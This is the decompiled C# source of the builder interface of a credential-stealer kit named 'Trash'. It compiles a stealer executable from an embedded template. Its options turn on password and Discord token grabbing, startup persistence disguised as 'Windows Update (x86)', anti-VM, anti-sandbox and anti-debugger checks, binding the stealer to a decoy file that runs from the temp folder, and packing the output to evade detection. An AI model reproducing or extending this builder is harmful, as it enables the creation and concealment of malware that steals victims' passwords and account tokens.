using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Netcrypt;
using Trash.Properties;

namespace Trash
{
	// Token: 0x0200000E RID: 14
	public class Other : UserControl
	{
		// Token: 0x06000098 RID: 152 RVA: 0x000025BA File Offset: 0x000007BA
		public Other()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00008700 File Offset: 0x00006900
		private void button1_Click_1(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = "stealer.exe";
			saveFileDialog.Filter = "Executables(logic?) (*.exe)|*.exe";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.compile(saveFileDialog.FileName);
				return;
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00008740 File Offset: 0x00006940
		public string ProcessShit(string code)
		{
			string result;
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default))
			{
				//string text = registryKey.OpenSubKey("trash\\lol").GetValue("ownr").ToString();
				string text = "kys123";
				if (text != null)
				{
					string text2 = code.Replace("#replacelol#", text);
					if (this.checkBox1.Checked)
					{
						text2 = text2.Replace("/*PWD", "").Replace("PWD*/", "");
					}
					if (this.checkBox2.Checked)
					{
						text2 = text2.Replace("/*START", "").Replace("START*/", "").Replace("%sname%", this.startname.Text);
					}
					if (this.checkBox3.Checked)
					{
						text2 = text2.Replace("/*TRACE", "").Replace("TRACE*/", "");
					}
					if (this.antidbg.Checked)
					{
						text2 = text2.Replace("/*DBG", "").Replace("DBG*/", "");
					}
					if (this.antisbie.Checked)
					{
						text2 = text2.Replace("/*SBIE", "").Replace("SBIE*/", "");
					}
					if (this.antivm.Checked)
					{
						text2 = text2.Replace("/*VM", "").Replace("VM*/", "");
					}
					if (this.checkBox4.Checked)
					{
						text2 = text2.Replace("/*DC", "").Replace("DC*/", "");
					}
					result = text2;
				}
				else
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00008908 File Offset: 0x00006B08
		public void compile(string path)
		{
			string text = Resources.Code;
			text = this.ProcessShit(text);
			List<string> list = new List<string>();
			string contents = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">\r\n  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>\r\n  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">\r\n    <security>\r\n      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">\r\n        <requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\" />\r\n      </requestedPrivileges>\r\n    </security>\r\n  </trustInfo>\r\n  <compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">\r\n    <application>\r\n    </application>\r\n  </compatibility>\r\n</assembly>\r\n";
			File.WriteAllText(Application.StartupPath + "\\manifest.manifest", contents);
			CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compilerParameters = new CompilerParameters();
			compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
			compilerParameters.ReferencedAssemblies.Add("System.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
			compilerParameters.ReferencedAssemblies.Add("System.IO.Compression.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Data.DataSetExtensions.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
			compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
			compilerParameters.ReferencedAssemblies.Add("mscorlib.dll");
			if (this.binder.Checked && this.checkBox2.Checked)
			{
				string text2 = "string FileNames = \"%FILENAME1%\";\r\n            string RandomChars = \"trashlol\" + DateTime.Now.Millisecond;\r\n                bool delay = false;\r\n                Directory.SetCurrentDirectory(Path.GetTempPath());\r\n                    ExtractResource(FileNames, RandomChars + FileNames);\r\n                    Process.Start(RandomChars + FileNames);\r\n                \r\n                if (delay == true)\r\n                {\r\n                    Thread.Sleep(30000);\r\n                }\r\n\r\n\r\n                ";
				compilerParameters.EmbeddedResources.Add(this.bindfile.Text);
				string fileName = Path.GetFileName(this.bindfile.Text);
				text2 = text2.Replace("%FILENAME1%", fileName);
				if (this.delayed.Checked)
				{
					text2 = text2.Replace("bool delay = false;", "bool delay = true;");
				}
				text = text.Replace("//bindmethodstart", text2);
			}
			else if (this.binder.Checked)
			{
				string text3 = "string FileNames = \"%FILENAME1%\";\r\n            string RandomChars = \"trashlol\" + DateTime.Now.Millisecond;\r\n                bool delay = false;\r\n                Directory.SetCurrentDirectory(Path.GetTempPath());\r\n                    ExtractResource(FileNames, RandomChars + FileNames);\r\n                    Process.Start(RandomChars + FileNames);\r\n                \r\n                if (delay == true)\r\n                {\r\n                    Thread.Sleep(30000);\r\n                }\r\n\r\n\r\n                ";
				compilerParameters.EmbeddedResources.Add(this.bindfile.Text);
				string fileName2 = Path.GetFileName(this.bindfile.Text);
				text3 = text3.Replace("%FILENAME1%", fileName2);
				if (this.delayed.Checked)
				{
					text3 = text3.Replace("bool delay = false;", "bool delay = true;");
				}
				text = text.Replace("//bindmethod", text3);
			}
			list.Add(text);
			bool flag = false;
			compilerParameters.GenerateExecutable = true;
			if (this.prot.Checked)
			{
				try
				{
					File.Delete(path);
				}
				catch
				{
				}
				compilerParameters.OutputAssembly = Path.GetTempPath() + "\\" + Path.GetFileName(path);
			}
			else
			{
				compilerParameters.OutputAssembly = path;
			}
			compilerParameters.GenerateInMemory = false;
			compilerParameters.TreatWarningsAsErrors = false;
			CompilerParameters compilerParameters2 = compilerParameters;
			compilerParameters2.CompilerOptions += "/t:winexe /unsafe /platform:x86";
			if (flag)
			{
				CompilerParameters compilerParameters3 = compilerParameters;
				compilerParameters3.CompilerOptions = compilerParameters3.CompilerOptions + " /win32manifest:\"" + Application.StartupPath + "\\manifest.manifest\"";
			}
			if (!string.IsNullOrEmpty(this.IconPath.Text) || (!string.IsNullOrWhiteSpace(this.IconPath.Text) && this.IconPath.Text.Contains("\\") && this.IconPath.Text.Contains(":") && this.IconPath.Text.Length >= 7))
			{
				if (!File.Exists(this.IconPath.Text))
				{
					MessageBox.Show("path's wrong", "Error");
					return;
				}
				CompilerParameters compilerParameters4 = compilerParameters;
				compilerParameters4.CompilerOptions = compilerParameters4.CompilerOptions + " /win32icon:\"" + this.IconPath.Text + "\"";
			}
			else if (!string.IsNullOrEmpty(this.IconPath.Text) && !string.IsNullOrWhiteSpace(this.IconPath.Text))
			{
				MessageBox.Show("Icon path is wrong", "error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			Thread.Sleep(100);
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, list.ToArray());
			if (compilerResults.Errors.Count > 0)
			{
				try
				{
					File.Delete(Application.StartupPath + "\\manifest.manifest");
				}
				catch
				{
				}
				foreach (CompilerError ce in compilerResults.Errors)
				{
					MessageBox.Show("Compilation error! Message: " + ce.ToString(), "Compiler", MessageBoxButtons.OK, MessageBoxIcon.Error);
				}
			}
			try
			{
				File.Delete(Application.StartupPath + "\\manifest.manifest");
			}
			catch
			{
			}
			if (this.prot.Checked)
			{
				try
				{
					byte[] bytes = Packer.Pack(File.ReadAllBytes(Path.GetTempPath() + "\\" + Path.GetFileName(path)), DotNetVersion.v4_0);
					File.WriteAllBytes(path, bytes);
					MessageBox.Show("Protected stealer successfully compiled and saved at " + path, "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					return;
				}
				catch (Exception ex)
				{
					MessageBox.Show("Exception caught: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
					return;
				}
			}
			MessageBox.Show("Stealer successfully compiled and saved at " + path, "", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00008E30 File Offset: 0x00007030
		private void button2_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Icon files (*.ico)|*.ico";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.IconPath.Text = openFileDialog.FileName;
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00008E68 File Offset: 0x00007068
		private void button3_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Any files(*.*)|*.*";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.bindfile.Text = openFileDialog.FileName;
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x000025C8 File Offset: 0x000007C8
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00008EA0 File Offset: 0x000070A0
		private void InitializeComponent()
		{
			this.components = new Container();
			this.timer1 = new System.Windows.Forms.Timer(this.components);
			this.button1 = new Button();
			this.IconPath = new TextBox();
			this.label2 = new Label();
			this.button2 = new Button();
			this.checkBox1 = new CheckBox();
			this.checkBox2 = new CheckBox();
			this.checkBox3 = new CheckBox();
			this.button3 = new Button();
			this.bindfile = new TextBox();
			this.binder = new CheckBox();
			this.delayed = new CheckBox();
			this.label3 = new Label();
			this.startname = new TextBox();
			this.antivm = new CheckBox();
			this.antisbie = new CheckBox();
			this.antidbg = new CheckBox();
			this.prot = new CheckBox();
			this.checkBox4 = new CheckBox();
			base.SuspendLayout();
			this.button1.BackColor = Color.FromArgb(64, 64, 64);
			this.button1.Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 0);
			this.button1.ForeColor = Color.White;
			this.button1.Location = new Point(459, 229);
			this.button1.Name = "button1";
			this.button1.Size = new Size(200, 61);
			this.button1.TabIndex = 0;
			this.button1.Text = "Build";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += this.button1_Click;
			this.IconPath.BackColor = Color.FromArgb(64, 64, 64);
			this.IconPath.BorderStyle = BorderStyle.FixedSingle;
			this.IconPath.ForeColor = Color.White;
			this.IconPath.Location = new Point(89, 264);
			this.IconPath.Name = "IconPath";
			this.IconPath.Size = new Size(189, 20);
			this.IconPath.TabIndex = 2;
			this.label2.AutoSize = true;
			this.label2.Font = new Font("Segoe UI Light", 12f);
			this.label2.ForeColor = Color.White;
			this.label2.Location = new Point(5, 261);
			this.label2.Name = "label2";
			this.label2.Size = new Size(78, 21);
			this.label2.TabIndex = 3;
			this.label2.Text = "Icon path:";
			this.button2.BackColor = Color.FromArgb(64, 64, 64);
			this.button2.ForeColor = Color.White;
			this.button2.Location = new Point(284, 263);
			this.button2.Name = "button2";
			this.button2.Size = new Size(51, 21);
			this.button2.TabIndex = 4;
			this.button2.Text = "Open";
			this.button2.UseVisualStyleBackColor = false;
			this.button2.Click += this.button2_Click;
			this.checkBox1.AutoSize = true;
			this.checkBox1.Font = new Font("Segoe UI Light", 12f);
			this.checkBox1.ForeColor = Color.White;
			this.checkBox1.Location = new Point(9, 5);
			this.checkBox1.Name = "checkBox1";
			this.checkBox1.Size = new Size(148, 25);
			this.checkBox1.TabIndex = 5;
			this.checkBox1.Text = "Password grabber";
			this.checkBox1.UseVisualStyleBackColor = true;
			this.checkBox2.AutoSize = true;
			this.checkBox2.Font = new Font("Segoe UI Light", 12f);
			this.checkBox2.ForeColor = Color.White;
			this.checkBox2.Location = new Point(9, 203);
			this.checkBox2.Name = "checkBox2";
			this.checkBox2.Size = new Size(132, 25);
			this.checkBox2.TabIndex = 6;
			this.checkBox2.Text = "Regular startup";
			this.checkBox2.UseVisualStyleBackColor = true;
			this.checkBox3.AutoSize = true;
			this.checkBox3.Font = new Font("Segoe UI Light", 12f);
			this.checkBox3.ForeColor = Color.White;
			this.checkBox3.Location = new Point(9, 36);
			this.checkBox3.Name = "checkBox3";
			this.checkBox3.Size = new Size(122, 25);
			this.checkBox3.TabIndex = 7;
			this.checkBox3.Text = "Trace save.dat";
			this.checkBox3.UseVisualStyleBackColor = true;
			this.button3.BackColor = Color.FromArgb(64, 64, 64);
			this.button3.ForeColor = Color.White;
			this.button3.Location = new Point(601, 9);
			this.button3.Name = "button3";
			this.button3.Size = new Size(45, 21);
			this.button3.TabIndex = 10;
			this.button3.Text = "Open";
			this.button3.UseVisualStyleBackColor = false;
			this.button3.Click += this.button3_Click;
			this.bindfile.BackColor = Color.FromArgb(64, 64, 64);
			this.bindfile.BorderStyle = BorderStyle.FixedSingle;
			this.bindfile.ForeColor = Color.White;
			this.bindfile.Location = new Point(428, 9);
			this.bindfile.Name = "bindfile";
			this.bindfile.Size = new Size(167, 20);
			this.bindfile.TabIndex = 9;
			this.binder.AutoSize = true;
			this.binder.Font = new Font("Segoe UI Light", 12f);
			this.binder.ForeColor = Color.White;
			this.binder.Location = new Point(327, 4);
			this.binder.Name = "binder";
			this.binder.Size = new Size(95, 25);
			this.binder.TabIndex = 11;
			this.binder.Text = "Bind with:";
			this.binder.UseVisualStyleBackColor = true;
			this.delayed.AutoSize = true;
			this.delayed.Font = new Font("Segoe UI Light", 12f);
			this.delayed.ForeColor = Color.White;
			this.delayed.Location = new Point(327, 35);
			this.delayed.Name = "delayed";
			this.delayed.Size = new Size(159, 25);
			this.delayed.TabIndex = 12;
			this.delayed.Text = "Run stealer delayed";
			this.delayed.UseVisualStyleBackColor = true;
			this.label3.AutoSize = true;
			this.label3.Font = new Font("Segoe UI Light", 12f);
			this.label3.ForeColor = Color.White;
			this.label3.Location = new Point(5, 234);
			this.label3.Name = "label3";
			this.label3.Size = new Size(112, 21);
			this.label3.TabIndex = 14;
			this.label3.Text = "Startups name:";
			this.startname.BackColor = Color.FromArgb(64, 64, 64);
			this.startname.BorderStyle = BorderStyle.FixedSingle;
			this.startname.ForeColor = Color.White;
			this.startname.Location = new Point(123, 234);
			this.startname.Name = "startname";
			this.startname.Size = new Size(212, 20);
			this.startname.TabIndex = 13;
			this.startname.Text = "Windows Update (x86)";
			this.antivm.AutoSize = true;
			this.antivm.Font = new Font("Segoe UI Light", 12f);
			this.antivm.ForeColor = Color.White;
			this.antivm.Location = new Point(9, 67);
			this.antivm.Name = "antivm";
			this.antivm.Size = new Size(85, 25);
			this.antivm.TabIndex = 15;
			this.antivm.Text = "Anti-VM";
			this.antivm.UseVisualStyleBackColor = true;
			this.antisbie.AutoSize = true;
			this.antisbie.Font = new Font("Segoe UI Light", 12f);
			this.antisbie.ForeColor = Color.White;
			this.antisbie.Location = new Point(9, 98);
			this.antisbie.Name = "antisbie";
			this.antisbie.Size = new Size(132, 25);
			this.antisbie.TabIndex = 17;
			this.antisbie.Text = "Anti-Sandboxie";
			this.antisbie.UseVisualStyleBackColor = true;
			this.antidbg.AutoSize = true;
			this.antidbg.Font = new Font("Segoe UI Light", 12f);
			this.antidbg.ForeColor = Color.White;
			this.antidbg.Location = new Point(327, 66);
			this.antidbg.Name = "antidbg";
			this.antidbg.Size = new Size(130, 25);
			this.antidbg.TabIndex = 18;
			this.antidbg.Text = "Anti-Debugger";
			this.antidbg.UseVisualStyleBackColor = true;
			this.prot.AutoSize = true;
			this.prot.Font = new Font("Segoe UI Light", 12f);
			this.prot.ForeColor = Color.White;
			this.prot.Location = new Point(459, 198);
			this.prot.Name = "prot";
			this.prot.Size = new Size(124, 25);
			this.prot.TabIndex = 19;
			this.prot.Text = "Protect stealer";
			this.prot.UseVisualStyleBackColor = true;
			this.checkBox4.AutoSize = true;
			this.checkBox4.Font = new Font("Segoe UI Light", 12f);
			this.checkBox4.ForeColor = Color.White;
			this.checkBox4.Location = new Point(327, 98);
			this.checkBox4.Name = "checkBox4";
			this.checkBox4.Size = new Size(178, 25);
			this.checkBox4.TabIndex = 20;
			this.checkBox4.Text = "Discord token grabber";
			this.checkBox4.UseVisualStyleBackColor = true;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.FromArgb(68, 68, 68);
			base.Controls.Add(this.checkBox4);
			base.Controls.Add(this.prot);
			base.Controls.Add(this.antidbg);
			base.Controls.Add(this.antisbie);
			base.Controls.Add(this.antivm);
			base.Controls.Add(this.label3);
			base.Controls.Add(this.startname);
			base.Controls.Add(this.delayed);
			base.Controls.Add(this.binder);
			base.Controls.Add(this.button3);
			base.Controls.Add(this.bindfile);
			base.Controls.Add(this.checkBox3);
			base.Controls.Add(this.checkBox2);
			base.Controls.Add(this.checkBox1);
			base.Controls.Add(this.button2);
			base.Controls.Add(this.label2);
			base.Controls.Add(this.IconPath);
			base.Controls.Add(this.button1);
			base.Name = "Other";
			base.Size = new Size(662, 293);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x0400007D RID: 125
		private IContainer components;

		// Token: 0x0400007E RID: 126
		private System.Windows.Forms.Timer timer1;

		// Token: 0x0400007F RID: 127
		private Button button1;

		// Token: 0x04000080 RID: 128
		private TextBox IconPath;

		// Token: 0x04000081 RID: 129
		private Label label2;

		// Token: 0x04000082 RID: 130
		private Button button2;

		// Token: 0x04000083 RID: 131
		private CheckBox checkBox1;

		// Token: 0x04000084 RID: 132
		private CheckBox checkBox2;

		// Token: 0x04000085 RID: 133
		private CheckBox checkBox3;

		// Token: 0x04000086 RID: 134
		private Button button3;

		// Token: 0x04000087 RID: 135
		private TextBox bindfile;

		// Token: 0x04000088 RID: 136
		private CheckBox binder;

		// Token: 0x04000089 RID: 137
		private CheckBox delayed;

		// Token: 0x0400008A RID: 138
		private Label label3;

		// Token: 0x0400008B RID: 139
		private TextBox startname;

		// Token: 0x0400008C RID: 140
		private CheckBox antivm;

		// Token: 0x0400008D RID: 141
		private CheckBox antisbie;

		// Token: 0x0400008E RID: 142
		private CheckBox antidbg;

		// Token: 0x0400008F RID: 143
		private CheckBox prot;

		// Token: 0x04000090 RID: 144
		private CheckBox checkBox4;
	}
}
